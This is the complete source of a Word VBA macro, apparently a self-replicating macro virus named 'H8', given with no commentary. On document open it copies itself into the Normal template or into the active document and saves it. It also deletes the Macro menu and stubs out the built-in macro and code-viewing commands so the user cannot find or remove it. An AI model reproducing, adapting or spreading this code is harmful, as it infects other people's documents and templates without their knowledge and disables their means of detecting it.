   Attribute VB_Name = "H8"
   Sub AutoOpen()
   On Error Resume Next
   ShowVisualBasicEditor = true 
   Options.VirusProtection = true 
   Options.SaveNormalPrompt = true 
   Options.ConfirmConversions = true 
   CommandBars("Tools").Controls("Macro").Delete
   If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
   Application.OrganizerCopy ThisDocument.FullName, Target.FullName, "H8", wdOrganizerObjectProjectItems
   If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   End Sub
   Sub ToolsOptions()
   Options.VirusProtection = True
   Options.SaveNormalPrompt = True
   Options.ConfirmConversions = True
   Dialogs(wdDialogToolsOptions).Show
   Options.VirusProtection = true 
   Options.SaveNormalPrompt = true 
   Options.ConfirmConversions = true 
   End Sub
   Sub ToolsMacro()
   End Sub
   Sub ViewVBCode()
   End Sub
